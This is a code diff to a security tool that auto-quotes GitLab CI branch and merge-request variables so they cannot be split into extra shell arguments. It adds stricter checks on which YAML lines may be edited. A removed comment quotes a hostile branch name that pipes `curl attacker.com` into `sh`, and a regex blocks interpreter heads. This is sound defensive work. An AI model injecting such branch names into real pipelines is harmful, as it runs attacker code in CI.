@@ -17,6 +17,7 @@ Level 2 (suggested, generates patch):
 from __future__ import annotations
 
 import re
+import shlex
 import subprocess
 from dataclasses import dataclass
 
@@ -655,11 +656,11 @@ def fix_disable_setup_cache_in_release(filepath: str, dry_run: bool = False) -> 
 #
 # All three quote-the-variable fixers share the same shape: a regex finds an
 # unquoted `$VAR` reference in a shell context and wraps it in double quotes.
-# Double-quoting bounds word-splitting (POSIX sh §2.6.5) without changing the
-# expanded value, so a branch name like `feature/$(curl attacker.com|sh)`
-# arrives at the downstream tool as a literal string instead of being re-parsed
-# as shell source.  Single-quoted `'$VAR'` would be safer still but changes
-# meaning (literal `$VAR`), so we only quote with `"..."`.
+# Double-quoting bounds word-splitting and pathname expansion. Ordinary
+# parameter expansion does not recursively parse its result as shell code;
+# later consumers can still interpret data as code or options. Single-quoting
+# `'$VAR'` changes its meaning to a literal reference, so these fixers use
+# double quotes where their supported source/edit profiles permit it.
 
 
 def _quote_ci_var_line(
@@ -798,31 +799,180 @@ _GITLAB_REF_VAR_RE = re.compile(r"\$\{?(?:" + "|".join(_GITLAB_REF_VARS) + r")\}
 _GITLAB_REF_SKIP_RES = (
     re.compile(r"^\s*#"),
     re.compile(r"^\s*[\w_]+:\s*\$\{?CI_"),
-    re.compile(r"^\s*(?:-\s*)?if:"),
     # Bash `[[ ... ]]` conditional — word splitting disabled per Bash §3.2.5.2,
     # so the variable is safe even unquoted. Skip to preserve the author's form.
     re.compile(r"\[\[[^\n]*\$\{?(?:" + "|".join(_GITLAB_REF_VARS) + r")\}?[^\n]*\]\]"),
 )
 
 
+def _gitlab_quote_head_supported(command: str) -> bool:
+    """Require fixed command identity; do not quote known code/dispatch inputs.
+
+    The shared lexer distinguishes active expansion from literal quoted dollars.
+    This is an edit precondition, not complete operand-role analysis: ordinary
+    literal tools retain argument grouping, without a downstream safety claim.
+    """
+    from .parsers.shell_words import shell_words_with_expansion
+
+    words = shell_words_with_expansion(command, re.compile(r"\$"))
+    if not words or words[0][1] or words[0][2]:
+        return False
+    if any(char in words[0][0] for char in "*?[]{}~"):
+        return False  # Unmodeled pathname/brace/tilde expansion in the head.
+    head = words[0][0].rsplit("/", 1)[-1]
+    if head.endswith(".exe"):
+        head = head[:-4]
+    if re.match(r"[A-Za-z_][A-Za-z0-9_]*=", words[0][0]):
+        return False
+    if head in {"command", "builtin", "env", "exec"}:
+        return False  # Effective command/operand roles need a separate profile.
+    return (
+        re.fullmatch(
+            r"(?:eval|sh|bash|dash|ksh|zsh|python[0-9.]*|node(?:js)?|perl|ruby|"
+            r"powershell|pwsh)",
+            head,
+        )
+        is None
+    )
+
+
+def _gitlab_quote_edit_lines(lines: list[str]) -> set[int]:
+    """Positively owned, one-line plain script scalars eligible for quoting.
+
+    The complement of a provider-condition mask is not editing permission.
+    Mixed flow rows, alias/merge replay, duplicate owners and parse recovery
+    refuse edits. Block/quoted/folded scalars need a separate physical-span and
+    shell-state proof; this whole-line fixer does not guess their boundaries.
+    This establishes edit location, not receiving-program safety.
+    """
+    from .gitlab_taint import _RESERVED_GITLAB_TOP_KEYS
+
+    content = "".join(lines)
+    events = tuple(
+        walk_workflow(
+            ".gitlab-ci.yml",
+            content=content,
+            recover=True,
+            include_keys=True,
+            include_merge_origins=True,
+        )
+    )
+    if any(e.kind in {EventKind.ERROR, EventKind.CUTOFF} for e in events):
+        return set()
+    keys: dict[tuple[object, ...], int] = {}
+    owners: dict[int, set[tuple[object, ...]]] = {}
+    for e in events:
+        if e.kind is EventKind.MAP_KEY:
+            keys[e.path] = keys.get(e.path, 0) + 1
+        if e.kind in {EventKind.MAP_KEY, EventKind.LEAF_SCALAR}:
+            owners.setdefault(e.line, set()).add(e.path)
+    phases = {"script", "before_script", "after_script"}
+    result = set()
+    contexts: dict[int, object] = {}
+    uncertain: set[object] = set()
+    if any(
+        e.kind is EventKind.MAP_KEY
+        and (
+            e.path == ("include",)
+            or (
+                len(e.path) == 2
+                and e.path[-1] == "extends"
+                and e.path[0] not in _RESERVED_GITLAB_TOP_KEYS
+            )
+        )
+        for e in events
+    ):
+        return set()  # Neither child nor template execution context is materialized.
+    for e in events:
+        if e.kind is not EventKind.LEAF_SCALAR or not 0 < e.line <= len(lines):
+            continue
+        p = e.path
+        owner = p[:-1] if isinstance(p[-1], int) else p
+        # Root script also supports the existing standalone script-fragment API.
+        owned = (len(owner) == 1 and owner[0] in phases) or (
+            len(owner) == 2
+            and owner[1] in phases
+            and isinstance(owner[0], str)
+            and (owner[0] == "default" or owner[0] not in _RESERVED_GITLAB_TOP_KEYS)
+        )
+        if not owned:
+            continue
+        context = "*" if len(owner) == 1 or owner[0] == "default" else owner[0]
+        command = e.value or ""
+        if e.value_kind == "quoted":
+            from .parsers.yaml_command_scalar import decode_single_line_command_scalar
+
+            command = decode_single_line_command_scalar(lines[e.line - 1], e) or ""
+            if not command:
+                uncertain.add(context)
+        if (
+            e.block_lines is not None
+            or "\n" in command
+            or any(c in command for c in "\\;|&<>`")
+            or "$(" in command
+            or re.match(
+                r"\s*(?:alias\b|eval\b|source\b|\.[ \t]|function\b|[A-Za-z_]\w*[ \t]*\(\))", command
+            )
+        ):
+            uncertain.add(context)
+        try:
+            shlex.split(command, posix=True)
+        except ValueError:
+            uncertain.add(context)
+        if (
+            not owned
+            or e.merge_origins
+            or e.value_kind != "plain"
+            or e.block_lines is not None
+            or "\n" in (e.value or "")
+            or owners.get(e.line) != {p}
+            or any(keys.get(owner[:d], 0) != 1 for d in range(1, len(owner) + 1))
+        ):
+            continue
+        raw = lines[e.line - 1].rstrip("\r\n")
+        prefix, command = raw[: e.column - 1], raw[e.column - 1 :]
+        if (
+            not re.fullmatch(
+                r"[ \t]*(?:-[ \t]+|(?:script|before_script|after_script|"
+                r"'script'|'before_script'|'after_script'|"
+                r'"script"|"before_script"|"after_script")[ \t]*:[ \t]*)',
+                prefix,
+            )
+            or command.rstrip() != e.value
+        ):
+            continue
+        if any(c in command for c in "\\\n\r;|&<>`#") or "$(" in command:
+            continue
+        try:
+            shlex.split(command, posix=True)
+        except ValueError:
+            continue
+        if not _gitlab_quote_head_supported(command):
+            continue
+        result.add(e.line - 1)
+        contexts[e.line - 1] = context
+    return {n for n in result if "*" not in uncertain and contexts[n] not in uncertain}
+
+
 def fix_quote_gitlab_refs(filepath: str, dry_run: bool = False) -> list[FixResult]:
     """Wrap unquoted ``$CI_COMMIT_REF_NAME`` / ``$CI_COMMIT_TAG`` /
     ``$CI_BUILD_REF_NAME`` in double quotes inside shell commands.
 
-    Bounds word-splitting without changing the expanded value — safe to apply
-    mechanically.  Skips heredoc bodies, YAML key-value assignments, ``rules:if:``
-    expressions, Bash ``[[ ... ]]`` conditionals, and references already inside
-    quotes.  Pairs with rule SEC4-GL-003.
+    Bounds argument splitting in uniquely owned plain script scalars. This is
+    not proof that the receiving program or a later code consumer is safe.
+    Ambiguous, mixed and multiline source spans refuse automatic edits.
+    Pairs with rule SEC4-GL-003.
     """
     results: list[FixResult] = []
     with open(filepath, encoding="utf-8") as f:
         lines = f.readlines()
 
     heredoc_skip = _quoted_heredoc_body_lines(lines)
+    editable = _gitlab_quote_edit_lines(lines)
     new_lines: list[str] = []
     modified = False
     for i, line in enumerate(lines):
-        if i in heredoc_skip:
+        if i in heredoc_skip or i not in editable:
             new_lines.append(line)
             continue
         rewritten = _quote_ci_var_line(line, _GITLAB_REF_VAR_RE, _GITLAB_REF_SKIP_RES)
@@ -868,7 +1018,6 @@ _GITLAB_CI_VAR_RE = re.compile(r"\$\{?(?:" + "|".join(_GITLAB_CI_VARS) + r")\}?"
 _GITLAB_CI_SKIP_RES = (
     re.compile(r"^\s*#"),
     re.compile(r"^\s*[\w_]+:\s*\$\{?CI_"),
-    re.compile(r"^\s*(?:-\s*)?if:"),
     # Bash `[[ ... ]]` — word splitting disabled per Bash §3.2.5.2, safe
     # even unquoted.  Mirror SEC4-GL-003's same exclude.
     re.compile(r"\[\[[^\n]*\$\{?(?:" + "|".join(_GITLAB_CI_VARS) + r")\}?[^\n]*\]\]"),
@@ -881,10 +1030,10 @@ def fix_quote_gitlab_ci_vars(filepath: str, dry_run: bool = False) -> list[FixRe
     ``$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`` in double quotes inside shell
     commands.
 
-    Bounds word-splitting without changing the expanded value — safe to
-    apply mechanically.  Skips heredoc bodies, YAML key-value assignments,
-    ``rules:if:`` expressions, Bash ``[[ ... ]]`` conditionals, and
-    references already inside quotes.  Pairs with rule SEC4-GL-001
+    Bounds argument splitting only in uniquely owned plain script scalars;
+    this does not repair code-consuming uses or establish downstream safety.
+    Ambiguous, mixed and multiline source spans refuse automatic edits.
+    Pairs with rule SEC4-GL-001
     (the GitLab analogue of SEC4-GH-018, where the variable list is the
     payload-bearing user-input vars rather than ref/tag identifiers).
     """
@@ -893,10 +1042,11 @@ def fix_quote_gitlab_ci_vars(filepath: str, dry_run: bool = False) -> list[FixRe
         lines = f.readlines()
 
     heredoc_skip = _quoted_heredoc_body_lines(lines)
+    editable = _gitlab_quote_edit_lines(lines)
     new_lines: list[str] = []
     modified = False
     for i, line in enumerate(lines):
-        if i in heredoc_skip:
+        if i in heredoc_skip or i not in editable:
             new_lines.append(line)
             continue
         rewritten = _quote_ci_var_line(line, _GITLAB_CI_VAR_RE, _GITLAB_CI_SKIP_RES)
